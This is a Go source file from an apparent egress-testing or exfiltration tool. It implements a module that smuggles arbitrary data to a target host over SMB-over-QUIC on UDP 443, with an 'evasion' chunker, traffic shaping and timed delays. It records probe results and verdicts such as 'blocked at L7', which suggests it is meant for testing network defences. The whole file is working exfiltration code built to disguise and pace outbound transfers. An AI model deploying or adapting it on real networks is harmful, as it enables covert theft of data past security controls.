package smb

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoSMBQUIC, NewSMBQUICExfiltrator())
}

// SMBQUICExfiltrator implements MS-SMB2 over QUIC (RFC 9000 + MS-SMB2) on UDP 443 with ALPN "smb".
type SMBQUICExfiltrator struct{}

func NewSMBQUICExfiltrator() *SMBQUICExfiltrator {
	return &SMBQUICExfiltrator{}
}

func (e *SMBQUICExfiltrator) Protocol() string {
	return common.ProtoSMBQUIC
}

func (e *SMBQUICExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	var chunker *evasion.StreamChunker
	if reader != nil {
		c, cErr := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
		if cErr == nil {
			chunker = c
			defer chunker.Close()
		}
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	tlsConf := &tls.Config{
		ServerName:         opts.TargetHost,
		NextProtos:         []string{"smb"},
		InsecureSkipVerify: opts.InsecureTLS,
	}

	quicConf := &quic.Config{
		HandshakeIdleTimeout: opts.Timeout,
		MaxIdleTimeout:       opts.Timeout,
	}

	// Dial QUIC session with ALPN "smb"
	qConn, dialErr := quic.DialAddr(ctx, targetAddr, tlsConf, quicConf)
	if dialErr != nil {
		result.Verdict = ClassifySMBError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateDurations(&result)
		return &result, dialErr
	}
	defer qConn.CloseWithError(0, "exfil done")

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.HandshakeTLS = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	stream, streamErr := qConn.OpenStreamSync(ctx)
	if streamErr != nil {
		result.Verdict = ClassifySMBError(streamErr)
		result.ErrorMessage = streamErr.Error()
		calculateDurations(&result)
		return &result, streamErr
	}
	defer stream.Close()

	// Transmit raw SMB2 Negotiate Protocol packet on QUIC stream (no NetBIOS header)
	negPkt := BuildSMB2NegotiateRequest(0)
	if _, err := stream.Write(negPkt); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to write SMB2 Negotiate to QUIC stream: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(negPkt))

	// Read SMB2 Negotiate Response
	respBuf := make([]byte, 1024)
	n, readErr := stream.Read(respBuf)
	if readErr != nil && readErr != io.EOF {
		result.Verdict = ClassifySMBError(readErr)
		result.ErrorMessage = fmt.Sprintf("failed to read SMB2 Negotiate from QUIC stream: %v", readErr)
		calculateDurations(&result)
		return &result, readErr
	}
	result.BytesRecv += int64(n)

	if n < 64 {
		err := fmt.Errorf("SMB2 Negotiate response truncated over QUIC: %d bytes", n)
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}

	_, err = DecodeSMB2Header(respBuf[:n])
	if err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = fmt.Sprintf("invalid SMB2 header over QUIC: %v", err)
		calculateDurations(&result)
		return &result, err
	}

	// If chunker exists, also stream chunks across the QUIC stream
	var headEvidence []byte
	if chunker != nil {
		for {
			chunkFrame, _, err := chunker.Next()
			if err == io.EOF {
				break
			}
			if err != nil {
				result.Verdict = ClassifySMBError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}

			if len(headEvidence) < 1024 {
				take := 1024 - len(headEvidence)
				if take > len(chunkFrame) {
					take = len(chunkFrame)
				}
				headEvidence = append(headEvidence, chunkFrame[:take]...)
			}

			if opts.Shaper != nil {
				if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
					result.Verdict = ClassifySMBError(err)
					result.ErrorMessage = err.Error()
					calculateDurations(&result)
					return &result, err
				}
			}
			if opts.Cadence != nil {
				delay := opts.Cadence.NextDelay()
				if delay > 0 {
					select {
					case <-time.After(delay):
					case <-ctx.Done():
						result.Verdict = ClassifySMBError(ctx.Err())
						result.ErrorMessage = ctx.Err().Error()
						calculateDurations(&result)
						return &result, ctx.Err()
					}
				}
			}

			// In SMB over QUIC, write chunk frame directly to stream
			if _, err := stream.Write(chunkFrame); err != nil {
				result.Verdict = ClassifySMBError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
			result.BytesSent += int64(len(chunkFrame))

			ackBuf := make([]byte, 1)
			_ = stream.SetReadDeadline(time.Now().Add(opts.Timeout))
			if _, err := io.ReadFull(stream, ackBuf); err != nil && err != io.EOF {
				result.Verdict = ClassifySMBError(err)
				result.ErrorMessage = fmt.Sprintf("failed to receive chunk ACK over QUIC: %v", err)
				calculateDurations(&result)
				return &result, err
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	if chunker != nil {
		if opts.ExpectedHash != "" {
			result.PayloadHash = opts.ExpectedHash
		} else {
			result.PayloadHash = chunker.PayloadHashHex()
		}
		result.TargetVolume = result.BytesSent
		result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	} else {
		result.RawEvidence = common.FormatBoundedRawEvidence(respBuf[:n])
	}
	calculateDurations(&result)

	return &result, nil
}
